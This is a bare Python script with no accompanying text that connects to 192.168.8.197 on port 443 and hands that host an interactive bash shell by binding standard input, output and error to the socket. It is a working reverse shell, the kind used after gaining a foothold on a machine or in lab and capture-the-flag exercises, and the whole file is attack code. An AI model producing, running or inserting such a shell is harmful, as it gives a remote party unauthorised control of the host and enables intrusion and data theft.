#!/usr/bin/python3
from os import dup2
from subprocess import run
import socket

count = 10

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.8.197",443))
dup2(s.fileno(),0)
dup2(s.fileno(),1)
dup2(s.fileno(),2)
run(["/bin/bash","-i"])
